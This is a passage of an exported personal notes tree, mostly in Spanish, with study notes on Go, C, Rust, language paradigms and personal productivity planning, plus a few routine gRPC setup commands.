      <node name="basico" unique_id="78" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1651004263" ts_lastsave="1652135240">
        <rich_text>la ffrma de crear modulos cambio del 1.15 en adelante antes se tenia que agregar al path los datos de GO

Variables, funciones y constantes
la declaracion de variables se hace:
	const {nombre} {tipo de dato} = {valor} // para constante
	const {nombre} = {valor} // se define por el valor el tipo
	{nombre} := {valor}
	var {nombre} {tipo} = {valor}
	var {nombre} {tipo}
	
	los zero values son valores por defectos que tienen las variables
		int -&gt; 0
		float64 -&gt; 0
		string -&gt; ‘’
		bool -&gt; false
		
	el incremental se maneja igual que en C
	
	primivitos:
		//Numeros enteros
		//int = Depende del OS (32 o 64 bits)
		//int8 = 8bits = -128 a 127
		//int16 = 16bits = -2^15 a 2^15-1
		//int32 = 32bits = -2^31 a 2^31-1
		//int64 = 64bits = -2^63 a 2^63-1

		//Optimizar memoria cuando sabemos que el dato simpre va ser positivo
		//uint = Depende del OS (32 o 64 bits)
		//uint8 = 8bits = 0 a 127
		//uint16 = 16bits = 0 a 2^15-1
		//uint32 = 32bits = 0 a 2^31-1
		//uint64 = 64bits = 0 a 2^63-1

		//numeros decimales
		// float32 = 32 bits = +/- 1.18e^-38 +/- -3.4e^38
		// float64 = 64 bits = +/- 2.23e^-308 +/- -1.8e^308

		//textos y booleanos
		//string = ""
		//bool = true or false

		//numeros complejos
		//Complex64 = Real e Imaginario float32
		//Complex128 = Real e Imaginario float64
		//Ejemplo : c:=10 + 8i
		
		en go toas las cadenas siempre tiene que ser en comillas dobles
		
	fmt:
		Printf, para usar en format, si se sab el tipo de se ve se usan los %tipo, si en dado caso no se sab ecual es se usa %v
		Sprintf, genera un string pero no lo muestra en consola, regresa el string es como un format
		printf mse sirve para saber el tipo de variable usando %T
		
	funciones
		se declaran: fun {nombre}({variables}) {!retorno!} {}
		si las variables son del mismo tipo se pueden declarar asi: a,b {tipo}
		si se requieren regresar mas de un valor se guardan en un ()
		una forma de ignorar un valor que no se requier usar se puede poner: _

Ciclos
- cada lenguaje tiene un tipo de ciclo, en el caso de golang solo existe for:
   → for condicional: for i:=0; i&lt;10; i++ {}
   → for while: for {!condicion!} {}
   → for forever: for {}
- ifs
   → if: if {condicion}
   → if-else: if {condicion} {} else {}
   → se usa &amp;&amp; para and
   → || se usa para or
- switch
   → se usa para sentencias multiples
   → switch {variable} {case value: {instruciones}  default: {instrucciones}}
   → generalmente se usa: switch {declaracion de variable}; {variable} {}
   → se puede usar: switch {case {variable-condicion} {}}
   → siempre es buena practica usar un default al final del switch
- defer
   → se usa para que antes de morirse el main ejecuta el codigo que este en defer
- break
   → sirve para romper un ciclo for
- continue
   → sirve para saltarse una iteracion en el ciclo for

Estructuras de datos basicas
- array y slices
   → array: var {nombre} [{tamanio}]{tipo de dato}, es inmutable
      ⇒ metodos: len() -&gt; tamanio y cap() -&gt; cuantos elementos puede guardar
   → slice: {nombre var} := []{tipo}{{lista de valores}}, son mutables
      ⇒ tiene los mismos metodos que el array
   → slicing: se usa para interactuar con los elementos, se hace igual que con python slice[{inicio}:{fin}]
   → para agregar un valor a un slice: slice = append(slice, {valor})
   → para agregar otra lista: slice = append(slice, {nueva lista}...)
   → se recorren usando un for: for index, value := range slice
- Maps
   → se creand: {nombre variable} := make(map[{tipo de dato:key}]{tipo de dato:value})
   → con for: for i, v := range {nombre map}, es de forma concurrente
   → obtencion de valores: value, err := {nombre map}[{key}], si la llave no existe en el diccionario el value es el zero value
- Structs
   → creacion type {nomre del struct} struct {atributos}
   → se instancia: {nombre} := {nombre del struct}{atributos}
- modificadores de acceso
   → si es minuscula el metodo es publico
   → si es mayuscula es privado
   → todo lo publico debe de llevar comentario

- structs and pointes
   → los punteros son para el acceso a la memoria
   → para dar el acceso se hace {nombre variable} := &amp;{otra variable}
   → al imprimir este nos dara la direccion de memoria
   → para acceder al valor se debe de poner: *{variable}
   → si se modifica el *{variable}, se cambia el valor de la variable original
   → se hace para hacer mas eficiente el codigo
   → los metodos de clase se definen: func ({nombre struct} {struct}) {nombre funcion} ({parametros}) {logica}
   → este modifica las variables de la clase: func ({nombre struct} *{struct}) {nombre funcion} ({parametros}) {logica}
   → para el custom de un struct: func ({nombre struct} {struct}) String() string { return fmt.Sprintf("{formato}") }
   → interfaces: es un metodo donde se pueden compartir entre varios structs
      ⇒ sirve para poder compartir un nombre de funcion para varias structs
      ⇒ se declaran: type {nombre interface} interface {{shared methods}}

Concurrencia y channels
- estar lidiando al mismo tiempo, paralelismo las hace
- hilo = tarea que ejecuta el procesador
- paralelo se usa los tres hilos
- concurrencia tiene todo disponible, mientras empieza con uno el otro se va creando, cuando se crea puede pausar la tarea para la que sigue
- en las gorutines, si muere primero el main que la rutina no la ejecuta
- se puede agregar time.Sleep para esperar pero no es recomendable
- para esperar se debe de agragar un WaitGroup: var wg sync.WaitGroup
- se agrega al WaitGroup con: wg.Add(1), ese mismo se debe de agregar a la funcion como un pointer
- en funcion se agrega: defer wg.Done()
- en main se debe de decir que espere: wg.Wait()
- generalmente las goroutines se usan con funciones anonimas
- channels
   → permiten compartir informacion entre rutinas
   → es un conducto donde solo se puede manejar un tipo de dato
   → se declaran: {name_channel} := make(chan {tipo de dato}, {cuantos valores puede manejar al momento})
   → se envian los datos con {name_channel} &lt;- {value} y se debe de pasar a la funcion
   → la salida se obtiene: &lt;-{name_channel}
   → buena practica, se debe indicar si el canal es de entrada o de salida:
      ⇒ channel &lt;-chan solo salida
- range, ayuda a hacer recorrido en todos los mensajes que se quedan en el channel
- select, sirve para buscar un mensaje desde un channel y hacer cierta operacion
- close, sirve para cerrar un canal y no volverse a usar



----------------------------------
76.70, 1600
100, 2050
75, 1600

5500</rich_text>
      </node>
      <node name="basic practico WS" unique_id="88" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652631305" ts_lastsave="1655058099">
        <rich_text>comando Go:
- go build: compila el archivo
- go run: crea el binario y ejecuta
- el package se le puede poner cualquier nombre, pero son usados para los modulos
- main es una funcion principal y necesaria
- se crean scanner para leer la entrada de los usuarios: {scanner} := bufio.NewScanner(os.Stdin); {scanner}.Scan(); {var} := {scanner}.Text()
- al trabajar con cadenas hay que tener mucho cuidado con los errores, ya que Go no lanza un exception

Structs and receivers
- las estructuras son tipos de datos que define el mismo usuario
- type {name} struct {body}
- method: func ({name} {name_struct}) {name_function} ({parameters}) {body}
- cuando se pasa un valor a una funcion generalmente se pasa un valor con una direccion completamente diferente
- para modificar valores de una estructura desde un metodo se requiere ahce por medio de apuntadores, pasando la struct con un *
- en go las listas son estaticas para algo dinamico se requiere hacer un slice:
   → type {name} struct {{name} []*{structure}}

Interfaces
- maps, son como diccionarios en python: {name} := make(map[{tipo llave}]{tipo de valores})
- sirven para evitar la creacion de codigo de mas, los metodos deben de tener el mismo nombre para ser tomados por la interfaz
- se declara la interfaz: type {nombre} interface { {funciones a meter} }

Concurrencia
- por medio de la palabra go se crean hilos o procesos de la funcion que se desea ejecutar
- las subrutinas no se conocen, se debe de usar algo para que se comuniquen
- channels
   → tiene que ser definidos con el tipo que recibira
   → se maneja el operador flecha para dar el mensaje
   → se crean: {name} := make(chan {type})
   → in function as parameter: {name} chan {datatype}
   → se transmiten: canal&lt;- {respuesta}
   → para leer: &lt;-canal
   → se tiene que hacer la llamada del canal las veces que se espera la respuesta</rich_text>
      </node>
      <node name="POO y concurrencia" unique_id="97" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655072393" ts_lastsave="1656538415">
        <rich_text>Go es orientado a objetos
- es un paradigma, uno de los predominantes en la industria
- llega a ser muy riguroso, pero permite alta reutilizacion de codigo y muchos patrones de disenio
- se puede alcanzar los conceptos de POO, pero muy diferente a Python y Java
- el equivalente de clases en Go son las structs
- para la modificacion de los datos de la estructura recordar que se debe de pasar como referencia
- cuando se quiere usar como todo es un objeto a veces no es algo aplicable
- se puede crear un objeto usando la palabra new, este retorna una referencia
- por medio de una funcion donde se resivan los parametros y regrese el apuntador del objeto a crear
- en la herencia solo se puede acceder a metodos publicos no a los privados
   → se usa para imprimir un mensaje solo usando una misma funcion para multiples clases que heredan de la misma
   → en go la herencia como tal no existe, se usa composicion, una clase contiene a la otra asi las clases son independientes
   → declarando la composicion sin necesidad de asignar la otra estructura nos ayuda a llamar directamente a las propiedades
- Interfaces
   → para ejecutar la composicion entre clases, se usa la palabra interface para declarar las interfaces, cada struct debe de tener el nombre de las funciones que tiene la interface
- para el abstract solo es necesario crear la estructura la cual se le pasa una variable de cadena que por medio de un if decide cual regresara
- Funciones anonimas, son solo para cuando se sta muy seguro que solo se usara una vez
   → se crea con: func() {tipo_retorno} {cuerpo}()
- Funciones variadicas y retornos con nombre
   → varios parametros en una funcion se declara: func {nombre}({nombre} ...{tipo_valor}) {tipo_retorno} {cuerpo de la funcion}

Testing:
- se crean los archivos: {nombre_archivo}_test.go
- para usar el testing se debe de estar dentro de un modulo
- code coverage
   → go test --cover, checa el porcentaje de cuanto codigo esta testeadp
   → go test --coverprofile={file.out}, crea un archivo para saber que esta probado
   → go tool cover --func={file.out}
   → go tool cover --html={file.out}
- profiling
   → go test --cpuprofile={file.out}
   → go tool pprof {file.out}

Concurrencia
- channels
   → unbuffered, se debe de estar 100 seguros de que alguien va a recibir el valor, se crean con {nombre} := make(chan {tipo})
   → buffered, se pueden usar en la misma funcion, se le da una cantidad limitada de valores, se crean con {nombre} := make(chan {tipo}, {number})
- waitgroup
   → se usa para tener una sincronizacion entre las rutinas
   → la rutina principal solo se dedica a lanzar las goroutines pero no las monitorea
   → para monitorearlas se puede usar un waitgroup
   → la funcion debe de recibir el parametro waitgroup
   → antes de llamar la rutina se dene de agregar uno al waitgruop
   → se debe de poner con defer wg.Done() en la rutina para que sepa que ya se ejecuto
   → para esperar: waitgroup.Wait()
   → con los canales podemos limitar el numero de procesos concurrentes que se pueden ejecutar, para eso los canales buffered
- Channels de lectura y escritura
   → declaracion de escritura, {nombre} chan&lt;-
   → declaracion de lectura, {nombre} &lt;-chan
- Worker pools
   → se crean trabajadores que hagan tareas especificas
- multiplexacion con select y case
   → se bloquean con canales si se quiere ver los datos
   → para que las rutinas se ejecuten en paralelo sin importar cual termine primero, de los canales se usa select</rich_text>
      </node>
      <node name="Concurrencia y patrones" unique_id="101" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1656612399" ts_lastsave="1656867608">
        <rich_text>- las goruotines se inician con un stack de 2KB

Race condition
- pasa cuando varias rutinas tratan de entrar a la misma variable al mismo tiempo, puede que alguna operacion no sea exitosa
- Sync mutex, Lock y Unlock
   → para conocer el riesgo de carrera een el programa: go build --race {file.go}, crea un binario y se debe de executar para saber si existe el race condition
   → se deve de crear un lock de tipo sync.Mutex
   → se tiene que enviar a la funcion
   → y en la funcion se debe de usar lock.Lock() y al finalizar el lock.Unlock
- mutex lectura y escritura
   → se usa cuando se tienen diferentes subrutinas, que pueden estar escribiendo y leyendo valores
   → se crea usando sync.RWMutex, para lectura se usa RLock y RUnlock

Patrones
- ayudan a resolver problemas muy comunes, se pueden adaptar a nuestra necesidad y en el lenguaje de programacion de nuestro grusto
- son conceptos generales que premiten resolver un problema
- patrones de los GoF, se tiene 23 en la primer version del libro
- estan por
   → creacionales, se dice como crear nuevos objetos, flexibles y reutilizables
   → estructurales, como  se crean los obejtos en estructuras mas grandes
   → de comportamiento, comuniciacion entre objetos, para comunicar diferentes objetos
- Factory, se pueden crear diferentes tipos y de acuerdo a lo que necesitamos regresamos el que sea especifico
- singleton, se usan para tener una clase que sea accesible de manera global</rich_text>
      </node>
      <node name="grpc" unique_id="107" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1659297652" ts_lastsave="1659651795">
        <rich_text>Add to .bashrc
</rich_text>
        <rich_text family="monospace">export GOPATH=$HOME/go
export PATH=$PATH:$GOPATH/bin</rich_text>
        <rich_text>

sudo apt install -y protobuf-compiler
</rich_text>
        <rich_text family="monospace">go install google.golang.org/protobuf/cmd/protoc-gen-go@latest</rich_text>
        <rich_text>
</rich_text>
        <rich_text family="monospace">go install google.golang.org/grpc/cmd/protoc-gen-go-grpc@latest</rich_text>
        <rich_text>

protoc --go_out=. --go_opt=paths=source_relative --go-grpc_out=. --go-grpc_opt=paths=source_relative proto/student.proto</rich_text>
      </node>
      <node name="CQRS" unique_id="108" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663354176" ts_lastsave="1663367712">
        <rich_text>CQRS -&gt; command query responsability segregarion
un manejo de colas para los servicios, no es necesario que se conecten entre ellos
RS -&gt; habilidades unicas cada servicio de Q y de C
C -&gt; solo se dedica a escribir en la base de datos, commands
Q -&gt; solo se encarga de lecturas, queries
esto sirve para solo escalar el servicio necesario, ya sea escalar solo la lectura o solo la escritura o ambos

Heeramientas:
- docker compose
- elastic search
- nats</rich_text>
      </node>
    </node>
    <node name="C" unique_id="132" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1672690232" ts_lastsave="1678466411">
      <rich_text>Variables and data types
- the information is stored in memory (RAM)
- RAM data is lost whe computer is off
- Hard drives store persistent data
- every byte has a unique address
- data types:
   → int
   → float
   → double
   → char
   → _Bool

Operators:
- for mathematical or logical functions
- assignment, relational and bitwise
- bitwise
   → operate on the bits in integer values
   → is not used in the common programs
   → used &amp; and |
- cast and sizeof
   → conversion is possible can happen automatically
   → you should not mix types
   → C is flexible
   → if used float and change to int the decimal portion is trucated
   → better to do an explicit converson
   → is possible use (int) {value}
   → sizeof is special jeyword in C, to get byte are occupied in memory
   → sizeof is an operator, and not a function

Control flow
- desicion makings
   → for create bifurcations
- loopings statements
   → for repeat code
- branching statements (break, continue, return)
- goto is available in C
   → goto {label}
   → is a bad practice

Arrays
- this is used to storage many data values of a specific type
- this is very used in videogames
- this is storage in the same name
- the same type
- declaration: {type} {name}[{size}]
- variable length
   → a VLA keeps the same size after creation
   → C99 introduces variable-length array, this is for numerical computing
   → you can not initialize a VLA in its declaration

Functions	
- code to particular tas
- syntax rules define the structure
- is same subroutines or procedures
- some actions causes action
- other find values
- divide and conquer
- reduce duplication code
- programs is better organized
- easier to read

write 3 function:
- finds the gratest common divisor of two non-negative integer, takes 2 ints
- calculate aboslute valio of a number, if takes float return floats if int ints
- compute the squeare root of a number
   → if negative, display message
   → use absolute function
- tic tac toe game
   → grid 3x3
   → create array to represent the board
   → type char and consiste of 10 elements
   → functions
      ⇒ checkforwin
      ⇒ drawboard
      ⇒ markboard

Strings
- char is for one character
- def: plusSign = ‘+’: not use "
- the " is used to string
- null char the code value is 0 this is with \0
- has no special variable type for strings
- strings are stored in an array of type char
- char myString[20] -&gt; string
- the compiler adds \0 of form automatic
- is not possible assing values before, is necesary use strncopy
- is not necessary &amp; on a string
- constant strings, const char message[] = “{string}”
- common functions in string.h
   → strlen
   → strcpy and strncopy
   → strcat and strncat
   → strcmp and strncmp
- searching, tokenizing and analyzing
   → searching
      ⇒ strchr and str str
   → tokenizing
      ⇒ a word limit by a limiter
      ⇒ breaking a sentence into words is called tokenizing
      ⇒ strtok
   → analyzing
      ⇒ islower, isupper, isalpha, isdigit, etc
   → use of pointer, is where is saved an address
   → this returns pointer where is found the values

ex:
	wirte function to count number of characters in a string
	rewrite strlen
	rewrite function concat, get 3 paremeter, result, str1, str2, return void
	rewirite if 2 strings are equals
	
	wirte another that display a string in reverse order
	is necesary use strcmp and strcpy for bubble sort

Pointers
- similar to indirection
- referencion something using name, reference or container
- manipulation of value from memory addess
- poiter access value by memory address
- this is the more powerful tools available in the C language
- the compilers needs how much memory needs
- every pointer will beassociated with a specific varaible
- pointer is used to arrays and strings
- pointers allow functions to modify data passed to them as variables
- used to optimize programs to use more or minus memory
- is possible create dynamic memory
- allow desing and develop complex data structures
- provides direct memory access
- defining pointers
   → is not decalred like normal variables
   → declare {type} *pointer;
   → the space between the * and pointer name is optional
   → the value is an unsigned integer on most systems
   → the %p represents type pointer
   → this is not initialized
   → is very important always initialize a pointer when is declared
   → null pointer to initialize pointer to NULL
   → this is equivalent to zero = NULL
   → NULL is used to point any location in memory
   → is necesary stddef.h to NULL
   → to initialize with varaible is necesary &amp;
   → is possible declare normal variables and pointer in the same statement
   → is good idea use p in name of pointer
- accesing pointers
   → is used the * to access the value of the variable pointed, dereferences
   → pointer occupy 8 bytes
   → to get address: (void*)&amp;pointer
   → sizeof to obtain the number of bytes a pointer occupies
- Pointer and arrays
   → use of pointer arithmetic
   → use *str in arguments and use ++str in for
   → use while(*str) where null char is weequal to 0
- Using pointer
   → address to pointer
   → dereference a pointer
   → the * operator gives the values stored
   → the &amp; opearator tell you where the pointer itself is stored
   → exists pointer arithmetic
   → is possible increment and decrement a pointer
   → add and substract values of pointer
   → get the difference between two pointer
   → to compare the pointers must be the same type
   → substract pointer get integer
   → substract a integer to pointer get a pointer
- Pointers and constants
   → const is not possible change the value
   → is possible use const with pointers to indicate that value must not be changed
- void pointer
   → means absece of any type
   → can contain the address of a data item of any type
   → use void* to return type in function with data in a type-indepedent way
   → this must first cast to annother pointer type
- arrays
   → the arrays is a collection of objects of same type that is possible reference using a single name
   → are differents to pointer but thay are very closely related
   → the most common use of pointer is with arrays
   → with pointer the program is very efficient
   → with pointers the code uses less memory
   → ar[i] == *(ar+i)
- Pointer arithmetic
   → use ++ and -- to get the next value
- pass by reference
   → copy by address
   → change value of references
   → this is not a deafult in C, the default is passing by value
   → is possible send pointer as an argument
   → the function can return pointer as return
   → const only useful when the parameter is a pointer, is not possible change the original pointer
   → with pointer return is to send multiple values
- dynamic memory allocation
   → exists three choices:
      ⇒ define array to contain the maximum number
      ⇒ use a variable-lenght array to dimension
      ⇒ allocate the array dynamically
      ⇒ this is allocation reserves apaces called the heap
      ⇒ the sack is another place
         • functions and local variables are stored here
         • when execution ends the spaces is freed
      ⇒ in the head is controlled by you
         • track when the memory is no longer required
         • you must free the spaces
- malloc, calloc, realloc
   → malloc
      ⇒ the simple standard libnrary function
      ⇒ is in stdlib
      ⇒ specify the number of bytes of memory
      ⇒ returns the address of the first byte
      ⇒ a pointer is the only place to put it
      ⇒ int *pNumber = (int*)malloc(100); // this allocate 25 ints is similar to int *pNumber = (int*)malloc(25 * sizeof(int));
      ⇒ return apointer of type void, is necesary the cast
      ⇒ request any number of bytes
      ⇒ is possible that allocation failes, check with if
      ⇒ always release memory
      ⇒ use free or NULL to liberate memory
      ⇒ always put the pointer in NULL
      ⇒ returns 0 if fails
   → calloc
      ⇒ it allocates memory as a number of elements of a given size
      ⇒ initialized the bytes in zero
      ⇒ requires two arguments, number of data items, size of each data item
      ⇒ is declared in stdlib.h
      ⇒ int *pNumber = (int*) calloc(75 sizeof(int))
      ⇒ the return error is NULL
   → realloc
      ⇒ reuse or extend memory that previously allocated with malloc or calloc
      ⇒ expects, a pointer containing an address that was proviuosly returned with c or m
      ⇒ the size in bytes of the new memory
      ⇒ allocates the amount of memory you specify by the second argument
      ⇒ transfer the content
      ⇒ return void* pointer with new memory or NULL if the operation fails
      ⇒ this preserves the content of original area

Structs
- tool for grouping elements together
- a powerful concept
- declaration describes how a structure is put together
- the variables is trat as a single unit
- struct is the word to create
- the members are fields
- to access the members: use .
- initialize structs is like arrays, is not necesary initialize all
- with {.member = value}, initialize the member
- nested:
   → to add structures is similar to declare a struct, struct {type} {name}
   → to access is {struct}.{nested struct}.{var}
- pointer:
   → in some older implementation structure cannot be passed as agument
   → with pointer is most efficient that structure
   → access to elements:
      ⇒ (*pointer).{var} = {value}
      ⇒ another sintax: {pointer}-&gt;{var} = {value}
- functions
   → in parameters struct {type} {name}
   → should be use pointer
   → using -&gt; is not necesary get again the original struct, the indirection operator

FILES
- for some apps is necessary not only data in memory, needs persistent and soted data like HDD
- C views a file as a continuos sequence of bytes
- each bytes can be read individually
- corresponds to the file structure in UNIX
- exists two types of files
   → text
   → binary, like data, music encoding
- automatically open three files
   → standard input
   → standard output
   → standard error
- Accessing files
   → file pointer or stream pointer
   → is associate a file pointer with a file programmatically
   → for every file is necesary one poniter
   → exists limit of number of files to open in FOPEN_MAX in stdio.h
   → fopen returns NULL
   → always fclose when use files
- Reading file
   → the fgetc read a character from a text file
   → rewind to specific position
   → fscanf to files, multiple chars or strings
- writing a file
   → simple function is fputc, write a single char
   → return EOF if failure
   → fputs to write a string
   → fprintf to format in file
- file positioning
   → random position in a file
   → ftell, get position
   → fgetpos, get position is more complicated
   → fseek to set a position
      ⇒ SEEK_SET, start file
      ⇒ SEEK_CUR, current position
      ⇒ SEEK_END, end file
   → fsetpos

CH:
	create program to find total of lines
	use fgetc to parse character in a file unil EOF
	display output the total number of lines
	
	create program that converts all chars of a file to uppercase and write the result out to a temporary file, rename temporary file to the original filename and remove the temporary file
	use fgetc and fputc
	rename and remove functions
	use islower function
	to convert substract 32 
	display the content of original file
	
	write program that print content of a file in reverse order
	use fseek
	use ftell
	display output</rich_text>
      <node name="advanced C" unique_id="137" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677434609" ts_lastsave="1677434609"/>
      <node name="pointers" unique_id="138" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1678466411" ts_lastsave="1679446141">
        <rich_text>arithmetic &amp; sizeof
- helo</rich_text>
      </node>
    </node>
    <node name="estructuras de datos" unique_id="172" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1692850245" ts_lastsave="1692852718">
      <rich_text>Arrays
- basic data structure
- store one more value
- does not increase table of symbol table, this is complex
- exists:
   → one dimensional
   → multidimensional
      ⇒ two
      ⇒ three
- formula for index: A[i] = Base Address + i * datasize
   → in C the formula is pointer</rich_text>
    </node>
    <node name="Rust" unique_id="187" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="40" is_bold="0" foreground="" ts_creation="1698026179" ts_lastsave="1702267316">
      <rich_text>por que usar:
- lenguaje mas amado por la comunidad
- modo seguro, evita hacer codigo inseguro o feo
- no tiene garbage collector
- se pueden crear desde microcontroladores hasta videojuegos
- lenguaje moderno con filosofia moderna
- desventajas
   → curva de aprendizaje muy pronunciada
- variables se declaran `let {variable}: {tipo} = {valor}`
- el println se maneja como macro: println!
- con variables cadena se usan el &amp;
- las variables son inmutables
- para modificar variables debemos especificarle que son mutables asi: `let mut {variable}: {valor}`
- dos formas de representar string: &amp;str y String
- para capturar datos: `std::io::stdin().read_line(&amp;mut {variable}).unwrap();`
- loop para hacer ciclos
- unwrap es para manejo de errores, si existe devuelve el valor, de otras maneras truena
- no existe el valor nulo
- si existe o no se usa un Option&lt;T&gt;, siendo T el tipo base
- los errores son un tipo de datos
- los errores se devuelven del tipo Result&lt;T,E&gt;, T, tipo sin error y E el error
- arrays y ciclos for
   → los vectores se declaran: `let mut {vector} = Vec::new);`
   → con tipo de dato: `let mut {vector}: Vec&lt;{tipo}&gt; = Vec::new();`
- for se usa `for i in 0..3 {}` con variables: `for {var} in {array} {}`
- vectores inmutables: `let {vector} = [{valores}]`, este no se pude modificar
- para crear una funcion: `fn {nombre}({variables con tipo})`

--- UDEMY
shadowing, creacion de una variable de nuevo usando let, se puede usar para definir algun nuevo valor desde una funcion, se puede hacer para cambiar el tipo de datos
para las constantes es obligatorio el tipo de dato, siempre son inmutables y no tienen shadowing
las variables no pueden ser globales
impl es usado para crear los metodos de las estructuras
generics es usado con &lt;T, V&gt;, esto sirve par apoder darle cualquier tipo de dato, se puede usar en funciones y retorno de funcion
Traits son como interfaces, puede sobreescribir los options, se escriben con camel case
closures son lambdas de python en rust</rich_text>
    </node>
    <node name="Historia de los langs" unique_id="189" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="41" is_bold="0" foreground="" ts_creation="1698688730" ts_lastsave="1699155613">
      <rich_text>las maquinas abstractas tienen:
- procesar datos primitivos
- controlar secuencias de ejecucion de operaciones
- controlar transferencia de datos
- manejo de memoria

ciclo de ejecucion:
- inicio
- trae instrucciones
- decodifica
- trae operando
- elige que ejecutar
- se guarda el estado si es que existen muchas operaciones
- terminando las operaciones finaliza

niveles de descripcion:
- gramatica
   → que oraciones son las correctas
   → secuencia de tokens
   → frases del lenguaje propio
- semantica
   → que significa una oracion correcta
- pragmatica
   → como usamos una oracion significativa, que quiere decir
- implementacion

imperativo, dice que va a hacer y como se va a hacer
declarativo, se enfoca en el resultado, no importa tanto el como

funcional tambien es declarativo, es complejo de aprende y analizar
se basa en funciones matematicas
primera clase, reconocidas para utilizarse como cualquier tipo de dato, se pueden llamar desde cualquier lado
orden superior, toma una o mas funciones como parametro, retorna una funcion como salida
funciones puras, son deterministicas, un valor de entrada da uno de salida, no genera efectos secundarios, no incluye funciones impuras, el resultado siempre es el mismo
funciones lambda, anonima, comportamiento de uso unico, contexto especifico o corto tiempo, simplicidad
efectos secundarios, estado de la aplicacion, valores en datos, modificacion de archivos, hasta llamado de un servidor

prog logica, NLP, recuperacion en BBDD, aplicaciones matematicas
	se basa en las clausulas de Horn
	
concurrencia un recurso, paralelismo varios recursos
estados de hilos:
	creado
	ejecutable/listo
	ejecutando
	bloqueado
	terminado
	
	
</rich_text>
      <rich_text scale="h3" foreground="#eff3f8">Qué es la máquina abstracta?</rich_text>
      <rich_text>
</rich_text>
      <rich_text scale="h3" foreground="#eff3f8">QuĆ© problema de la programaciĆ³n secuencial buscaba resolver el paradigma estructurado?</rich_text>
      <rich_text>
</rich_text>
      <rich_text scale="h3" foreground="#eff3f8">En qué situación del mundo real podemos apreciar un caso de concurrencia?</rich_text>
      <rich_text>
</rich_text>
      <rich_text scale="h3" foreground="#eff3f8">Qué lenguaje introdujo el concepto de "código intermedio"?</rich_text>
    </node>
  </node>
  <node name="Crecimiento personal" unique_id="45" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1617947184" ts_lastsave="1684703124">
    <node name="Personalidad y productividad" unique_id="46" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1617947195" ts_lastsave="1620506007">
      <rich_text>Que es ser productivo??
- no es ser una persona que trabaja mucho, implica tener mas cuidado de uno que del trabajo como tal
- una persona productiva es capaz de producir, hacer uso de sus recursos, tiempo y espacio de manera efectiva para entregar un producto
- eficacia -&gt; medios llegar a un fin empleando los mejores medios
- eficiencia -&gt; lograr el efecto que se desea
Principios de productividad;
- lo que se mide mejora
- dejar de hacer
- explotar oportunidades
- encontrar mejores usos
Personal UX:
- tener mirada critica
- analisis, elaborar objetivos y probar
Herramientas:
- 16 personalidades - hecho
- big 5 personalities - falta
- eneagrama - hecho
- disc - estilos de liderasgo - falta
- high5 test - carrera, creo hecho

Auditoria de la vida
Mi vida en semanas:
- principales objetivos que he logrado conseguir
- revisa la vida de acuerdo como se ha vivido

Conocer la persona productiva
- Agilismo al personal de UX
   → autoconocimiento
   → perspectiva
   → Planear
   → Revisar
   → Focalizar
   → tomar decisiones
      ⇒ volver a pivotear
   → Medición
   → Documentar y compratir
   → Reflexionar
   → Poner en acción
      ⇒ Iterar
- Buenas practicas siendo agil
   → orientar objetivos a una meta
   → renuncia y ganar (decir si y no)
   → el metodo de planeacion es flexible
   → vive y despierta a la realidad
   → cumple con las tareas
   → aprender a perdonarse
   → encuentra equilibrio
- Principios
   → curiosidad: actitud de acercarse a la vida con una curiosidad insaciable y la busqueda continua del conocimiento
   → conexión: interconexion entre todos los conocimientos

Autoconocimiento:
- es la gestion de uno mismo, tiempo, recursos, canales y habitos
- las 6 w's, aplicadas a la vida
   → When
   → Where
   → What
   → Who
   → How
   → Why
- DOFA:
   → Fortalezas
   → Oportunidades
   → Debilidades
   → Amenazas

La rueda de la vida
- revisar salud
- tiempo de amigos y familia
- tu otro significativo, vida en pareja
- crecimiento personal, se logra todo lo que se ha planeado
- hobbies y tiempo libre
- actividades en casa, cuanto tiempo pasas en casa y le dedicas a eso
- carrera, que se requiere estudiar y cual es el plan
- dinero, compensación

Hero canvas:
- la coducta, pensamientos, actitudes y comportamientos, son un estimulo
- pensamiento, que tan proactiva
- relaciones, verbal y no verbal
- liderazgo, como gestiona los proyectos
- emocion, autoconocimiento y regulacion
- autodireccion, vision, rapidez del aprendizaje
- actitud, accion de la persona y propagacion de conocimiento
- resultado al cual se orienta

Definir User persona
- se resuelven problemas de la vida de uno mismo
- se tiene que llevar lo obtenido a valores cualitativas y cuantitativas
- definir atributos
- conectar pasiones, sueños y propositos
- ikigai

# Crea tu proposito y tu propuesta de vida
- mision manifesta, un enunciado que te motiva o a donde quieres llegar
- como realizar ese manifesto:
   → examinar la vida de otros
   → determina tu yo ideal
   → considera tu legado
   → determina tu proposito
   → clarifica tu aptitudes
   → escribe tu declaración
   → refínala

# Proyecta tu plan de vida
- se trata de estructura las herramientas en la vida en un determinado tiempo
- proyeccion: emociones y sentimientos de hacer algo que te hace sentir bien

# Rediseña tu vida
- tener una vida sistemica
- Brainstorming:
   → reestructura de la vida a cosas mas importantes
